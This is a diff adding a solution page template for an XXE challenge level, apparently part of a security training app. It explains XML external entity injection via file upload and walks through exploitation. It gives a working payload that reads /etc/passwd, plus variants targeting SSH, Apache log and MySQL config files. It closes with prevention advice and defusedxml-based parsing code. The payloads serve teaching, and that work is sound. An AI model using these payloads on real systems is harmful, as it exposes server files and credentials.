@@ -1,0 +1,123 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: XXE Level 4{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header">
+                <h2 class="text-center"><i class="bi bi-check-circle-fill text-success me-2"></i>Solution: Level 4 - XXE in XML File Upload</h2>
+            </div>
+            <div class="card-body solution-content">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This level demonstrates XXE vulnerability in file upload processing. The application accepts XML file uploads
+                    and processes them without proper external entity restrictions, allowing attackers to read local files.
+                </p>
+                <p>
+                    The vulnerability exists because the XML file upload processor:
+                </p>
+                <ul>
+                    <li>Accepts XML files through file upload interface</li>
+                    <li>Processes uploaded XML files without entity restrictions</li>
+                    <li>Allows external entity declarations in uploaded files</li>
+                    <li>Returns processed content that may include external entity data</li>
+                </ul>
+                
+                <h3>Solution</h3>
+                <p>To solve this challenge, you need to create a malicious XML file and upload it through the file upload interface:</p>
+                
+                <div class="alert alert-secondary">
+                    <h5><i class="bi bi-terminal me-2"></i>Malicious XML File Content</h5>
+                </div>
+                <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE document [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;document&gt;
+    &lt;metadata&gt;
+        &lt;title&gt;Malicious Document&lt;/title&gt;
+        &lt;author&gt;Attacker&lt;/author&gt;
+        &lt;created&gt;2024-01-01&lt;/created&gt;
+    &lt;/metadata&gt;
+    &lt;content&gt;
+        &lt;section&gt;
+            &lt;header&gt;File Contents&lt;/header&gt;
+            &lt;text&gt;&amp;xxe;&lt;/text&gt;
+        &lt;/section&gt;
+    &lt;/content&gt;
+&lt;/document&gt;</code></pre>
+                
+                <h4>Step-by-Step Exploitation:</h4>
+                <ol>
+                    <li><strong>Create Malicious File:</strong> Create an XML file with the above content</li>
+                    <li><strong>Save as .xml:</strong> Save the file with a .xml extension (e.g., malicious.xml)</li>
+                    <li><strong>Upload File:</strong> Use the file upload interface to upload the malicious XML file</li>
+                    <li><strong>Entity Processing:</strong> The XML parser processes the external entity reference</li>
+                    <li><strong>File Disclosure:</strong> The contents of /etc/passwd are read and displayed</li>
+                </ol>
+                
+                <h3>Alternative File Targets</h3>
+                <p>You can target other sensitive files by modifying the entity declaration:</p>
+                <pre><code>&lt;!-- Read SSH configuration --&gt;
+&lt;!ENTITY xxe SYSTEM "file:///etc/ssh/sshd_config"&gt;
+
+&lt;!-- Read application logs --&gt;
+&lt;!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log"&gt;
+
+&lt;!-- Read database configuration --&gt;
+&lt;!ENTITY xxe SYSTEM "file:///etc/mysql/my.cnf"&gt;</code></pre>
+                
+                <h3>Real-world Impact</h3>
+                <p>
+                    XXE in file upload can be particularly dangerous because:
+                </p>
+                <ul>
+                    <li>File uploads are often processed automatically in enterprise systems</li>
+                    <li>Upload endpoints may have elevated privileges for file processing</li>
+                    <li>Multiple file formats (XML, DOCX, SVG) can contain XXE payloads</li>
+                    <li>Automated processing makes detection more difficult</li>
+                    <li>Can be combined with other vulnerabilities for complex attack chains</li>
+                </ul>
+                
+                <h3>Prevention</h3>
+                <p>To prevent XXE in file upload processing:</p>
+                <ul>
+                    <li>Disable external entity processing in XML parsers</li>
+                    <li>Validate file types and content before processing</li>
+                    <li>Use secure XML parsing libraries with XXE protection</li>
+                    <li>Implement file content sanitization</li>
+                    <li>Use allowlists for acceptable XML structures</li>
+                    <li>Process uploaded files in sandboxed environments</li>
+                    <li>Implement proper file size and complexity limits</li>
+                </ul>
+                
+                <h4>Secure File Upload Processing (Python):</h4>
+                <pre><code>from defusedxml import ElementTree as DefusedET
+import xml.etree.ElementTree as ET
+
+def secure_xml_upload_processing(uploaded_file):
+    try:
+        # Use defusedxml for secure parsing
+        tree = DefusedET.parse(uploaded_file)
+        root = tree.getroot()
+        
+        # Validate against schema if available
+        # validate_against_schema(root)
+        
+        return process_xml_safely(root)
+    except Exception as e:
+        # Log security event
+        logger.warning(f"XML upload security violation: {e}")
+        return None</code></pre>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('xxe_level4') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
